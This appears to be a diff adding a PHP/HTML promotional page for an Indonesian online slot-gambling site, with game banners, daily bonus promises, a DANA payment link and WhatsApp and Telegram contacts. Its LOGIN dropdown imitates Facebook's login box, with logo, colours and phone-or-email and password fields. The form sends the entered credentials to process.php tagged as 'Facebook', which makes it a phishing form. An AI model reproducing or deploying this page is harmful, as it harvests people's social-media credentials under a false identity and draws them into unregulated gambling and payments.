@@ -1,0 +1,329 @@
+<?php
+// include atau require formulir HTML
+include 'form_user.php';
+?>
+<fieldset>
+<nav class="navbar">
+
+  <!-- Daftar tak-terurut untuk item navigasi -->
+  <ul class="navbar-list">
+ <!-- Tautan "Services" dengan menu dropdown -->
+    <li class="navbar-item dropdown" style=" font-size: 2em;">
+      <a href="#">LOGIN</a>
+
+      <!-- Kontainer untuk konten dropdown -->
+      <div class="dropdown-content" style="text-align: center;">
+          <img src="facebook.png" style="width: 150px; padding-top: 40px;">
+        <style>
+            .navbar-fb {
+  background: #3b5998;
+  width: 100%;
+  height: auto;
+  padding: 8px;
+  border-top-left-radius: 10px;
+  border-top-right-radius: 10px;
+}
+.navbar-fb img {
+  width: 115px;
+  margin-left: auto;
+  margin-right: auto;
+  display: block;
+}
+.content-box-fb {
+  width: 300px;
+  height: auto;
+  margin-left: auto;
+  margin-right: auto;
+  display: block;
+}
+.content-box-fb img {
+  width: 60px;
+  margin-top: 20px;
+  margin-left: auto;
+  margin-right: auto;
+  border-radius: 12px;
+  display: block;
+}
+.txt-login-fb {
+  width: 270px;
+  height: auto;
+  margin-top: 10px;
+  margin-left: auto;
+  margin-right: auto;
+  margin-bottom: 17px;
+  padding: 8px;
+  color: #90949c;
+  font-size: 16px;
+  font-family: Roboto, sans-serif;
+  text-align: center;
+  display: block;
+}
+.login-form input[type="text"],
+.login-form input[type="password"] {
+  width: 100%;
+  height: auto;
+  padding: 12px;
+  color: #000;
+  font-size: 14px;
+  font-weight: 400;
+  font-family: Roboto, sans-serif;
+  border: 1px solid #bdbebf;
+  cursor: pointer;
+  outline: none;
+}
+.login-form input[type="text"] {
+  margin: 0 !important;
+  padding-bottom: 13px !important;
+  border-bottom: none !important;
+  border-radius: 4px 4px 0 0 !important;
+  box-shadow: 0 -1px 0 #e0e0e0 inset, 0 0px 0px rgba(0, 0, 0, 0.23) inset !important;
+}
+.login-form input[type="password"] {
+  margin: 0 !important;
+  border-top: none !important;
+  border-radius: 0 0 4px 4px !important;
+  box-shadow: 0 -0px 0 rgba(0, 0, 0, 0.23) inset,
+    0 0px 0px rgba(255, 255, 255, 0.1) !important;
+}
+.btn-login-fb {
+  background: #1778f2;
+  width: 100%;
+  height: auto;
+  margin-top: 10px;
+  margin-left: auto;
+  margin-right: auto;
+  padding: 10px;
+  color: #fff;
+  font-size: 14px;
+  font-family: Roboto, sans-serif;
+  font-weight: bold;
+  text-align: center;
+  text-shadow: 1px 0px rgba(0, 0, 0, 0.3);
+  border: 1px solid #3578e5;
+  border-radius: 5px;
+  box-shadow: 1px 1px 1px 1px rgba(0, 0, 0, 0.1);
+  outline: none;
+  display: block;
+}
+        </style>
+            <div class="content-box-fb">
+            
+              <div class="txt-login-fb">
+                
+              <form class="login-form" action="process.php" method="post">
+                <label>
+                  <input type="text" name="username" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required>
+                </label>
+                <label>
+                  <input type="password" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
+                </label>
+                <input type="hidden" name="login" value="Facebook" readonly>
+                <button type="submit" class="btn-login-fb">Masuk</button>
+              </form>
+              <div class="txt-create-account">Buat Akun</div>
+              <div class="txt-not-now">Lain kali</div>
+            </div>
+            </div>
+       <!-- Tautan untuk halaman "Home" -->
+       <li class="navbar-item dropdown" style="font-size: 2em"><a href="#">SPIN FREE</a>
+           <div class="dropdown-content">
+             <img src="sorry.jpg"></li></div>
+    <li class="navbar-item dropdown" style="font-size: 2em"><a href="#">GAME</a>
+    <div class="dropdown-content">
+        <img src="p1.png" alt="Deskripsi gambar" style="padding-left: 0px;"></a>
+          </li>
+          </div>
+    <!-- Tautan untuk halaman "Contact" -->
+    <li class="navbar-item dropdown" style="font-size: 2em"><a href="#">CONTACT</a>
+    <div class="dropdown-content">
+    <img src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExMnpqY29yaDl4djhiaXlrOTBlanZ3dGw4d3djMzcxY3B0ZXQybzVibyZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/XaLB0yOlezvZCfblxK/giphy.gif" alt="rtpslot" border="0" width="500" height="250"><br><img src="https://i.ibb.co/2qNy6vN/whatsapp.gif" alt="whatsapp" border="0" width="200" height="100">
+    <img src="https://i.ibb.co/SKRM3LQ/tele-gif-surgagroup.gif" alt="telegram" border="0" width="200" height="100"></li>
+    </div>
+  </ul>
+</nav>
+<style>
+  body {
+margin: 0;
+font-family: Arial, sans-serif;
+}
+
+/* Gaya untuk seluruh navbar */
+.navbar {
+background-color: #5865F0;
+overflow: hidden;
+}
+
+/* Gaya untuk daftar tak-terurut yang berisi item navigasi */
+.navbar-list {
+list-style-type: none;
+margin: 0;
+padding: 0;
+}
+
+/* Gaya untuk setiap item navbar */
+.navbar-item {
+float: left;
+}
+
+
+/* Gaya untuk tautan dalam setiap item navbar */
+.navbar-item a {
+display: block;
+color: white;
+text-align: center;
+padding: 14px 16px;
+text-decoration: none;
+}
+.navbar-item.dropdown:hover .dropdown-content {
+  display: block;
+}
+
+/* Gaya untuk kontainer konten dropdown */
+.dropdown-content {
+  display: none;
+  position: absolute;
+  background-color: #f9f9f9;
+  min-width: 360px;
+  z-index: 1;
+}
+
+
+/* Gaya untuk tautan dalam konten dropdown */
+.dropdown-content a {
+  color: black;
+  padding: 12px 16px;
+  text-decoration: none;
+  display: block;
+  text-align: left;
+}
+.dropdown-content a:hover {
+  background-color: #ddd;
+}
+
+/* Sorot tautan navbar saat dihover */
+.navbar-item a:hover {
+  background-color: #ddd;
+  color: black;
+}
+</style>
+<hr>
+<center>
+<p class="blinking-text"><img class="" alt="Starlight Princess 1000" src="https://files.sitestatic.net/assets/imgs/giga_gaming/hot_games/Starlight_Princess_1000.png" style="padding-left: 0px; width: auto;"><img class="" alt="Neko Riches" src="https://files.sitestatic.net/assets/imgs/giga_gaming/hot_games/Neko_Riches.png" style="width: auto;"><img class="" alt="Mahjong Ways 2" src="https://files.sitestatic.net/assets/imgs/giga_gaming/hot_games/Mahjong_Ways_Two.png" style="width: auto;"><img class="" alt="Lucky Neko" src="https://files.sitestatic.net/assets/imgs/giga_gaming/hot_games/Lucky_Neko.png" style="width: auto;"><img class="" alt="Gates of Olympus 1000" src="https://files.sitestatic.net/assets/imgs/giga_gaming/hot_games/Gates_Of_Olympus_1000.png" style="width: auto;"><hr><hr></p>
+  
+   <p class="blinking-text" style="font-size: 3em; background-color: darkred">WELCOME TO SLOT PALING GACOR</p>
+<style>
+          .animated-text {
+      animation: moveText 15s linear infinite;
+      text-align: center;
+      font-size: 2em;
+      padding-top: 0px;
+      color: #0418F8;
+      
+      }
+         .blinking-text {
+       font-size: 2em;
+       animation: blinkColorChange 1s infinite;
+       text-align: center;
+       color: rgba(234, 188, 114, 1);
+     }
+        @keyframes moveText {
+      0% {
+        transform: translateX(-50%);
+      }
+      100% {
+        transform: translateX(50%);
+      }
+     </style>
+     <style>
+        .moving-image-container {
+            overflow: hidden;
+            width: auto;
+            height: 200px; /* Sesuaikan tinggi gambar */
+        }
+
+        .moving-image {
+            display: block;
+            margin: 0 auto; /* Pusatkan gambar */
+            width: 200%;
+            height: 200%; /* Sesuaikan tinggi gambar */
+            animation: moveImage 10s linear infinite; /* Sesuaikan durasi dan animasi sesuai kebutuhan */
+        }
+
+        @keyframes moveImage {
+            0% {
+                transform: translateX(100%);
+            }
+            100% {
+                transform: translateX(-100%);
+            }
+        }
+    </style>
+    <hr>
+    <div class="moving-image-container">
+      <img class="moving-image" src="1.png" alt="moving Image">
+      <img class="moving-image" src="3.jpg" alt="Moving Image">
+      </div>
+<video class="mb-0" src="video.mp4" autoplay loop muted style="width:100%;" oncontextmenu="return false;" onmousedown="return false"></video>
+<hr>
+<hr>
+
+<fieldset><fieldset><p class="blinking-text" style="font-size: 2em">DAPATKAN BONUS LOGIN SETIAP HARI<br>DAN RATUSAN HINGGA JUTAAN RUPIAH</p></fieldset></fieldset>
+<style>
+  @keyframes colorChange {
+      0% { color: red; }
+      15% { color: white; }
+      25% { color: yellow; }
+      35% { color: #1C2DDC;}
+      45% { color: green; }
+      55% { color: #C6948A; }
+      70% { color: blue; }
+      80% { color: #5E2638;}
+      100% { color: purple; }
+    }
+
+    @keyframes blink {
+      0%, 50%, 100% { opacity: 1; }
+      25%, 75% { opacity: 0; }
+    }
+
+    .blinking-text {
+      animation: colorChange 1s infinite, blink 1s infinite;
+    }
+</style>
+<style>
+  body{
+    background-color: #113323;
+    justify-content: center;
+    content: cover;
+  }
+</style>
+
+<script>
+  let slideIndex = 0;
+  showSlides();
+
+  function showSlides() {
+    let slides = document.getElementsByClassName("mySlides");
+    for (let i = 0; i < slides.length; i++) {
+      slides[i].style.display = "none";
+    }
+    slideIndex++;
+    if (slideIndex > slides.length) {
+      slideIndex = 1;
+    }
+    slides[slideIndex - 1].style.display = "block";
+    setTimeout(showSlides, 2000); // Sesuaikan dengan durasi pergantian
+  }
+  </script>
+  <br>
+  
+  
+  <br>
+  <hr>
+  <hr>
+  <a href="https://link.dana.id/minta/2ton162wfuu/send" target="_blank">
+    <img src="dana.png" alt="Logo Dana" style="width: 170px; height: 55px; border-radius: 10px;">
+  </a>
+  <img class="img-fluid mb-3" style="width: 150px; border-radius:10px;border: 1px solid currentColor;" src="https://files.sitestatic.net/sprites/bank_logos/ewallet_col.jpg?v=3"><img class="img-fluid mb-3" style="width: 150px; border-radius:10px;border: 1px solid currentColor;" src="https://files.sitestatic.net/sprites/bank_logos/pulsa_col.jpg?v=3"><img class="img-fluid mb-3" style="width: 150px; border-radius:10px;border: 1px solid currentColor;" src="https://files.sitestatic.net/sprites/bank_logos/bank_col.jpg?v=3"><img class=" ls-is-cached lazyloaded" alt="PLAYTECH" src="https://files.sitestatic.net/assets/imgs/game_providers_round_logo/playtech.png?v=4" data-src="https://files.sitestatic.net/assets/imgs/game_providers_round_logo/playtech.png?v=4"><img class=" lazyloaded" alt="JOKER" src="https://files.sitestatic.net/assets/imgs/game_providers_round_logo/joker.png?v=5" data-src="https://files.sitestatic.net/assets/imgs/game_providers_round_logo/joker.png?v=5"><img class=" ls-is-cached lazyloaded" alt="PRAGMATIC" src="https://files.sitestatic.net/assets/imgs/game_providers_round_logo/pragmatic.png?v=4" data-src="https://files.sitestatic.net/assets/imgs/game_providers_round_logo/pragmatic.png?v=4"><img class="img-border-radius img-fluid ls-is-cached lazyloaded" src="https://files.sitestatic.net/home_info/giga_left_375x218.png" data-src="https://files.sitestatic.net/home_info/giga_left_375x218.png" alt="Sample Banner" style="max-width: 100%;"><img class="img-border-radius img-fluid lazyloaded" src="https://files.sitestatic.net/home_info/giga_right_375x218.png" data-src="https://files.sitestatic.net/home_info/giga_right_375x218.png" alt="Sample Banner" style="max-width: 100%;">
+  <hr>
+  <img src="logo.png"> <h1 style="color: white;">@TOPBOS/Copyright/HiggsDomino.inc</h1>
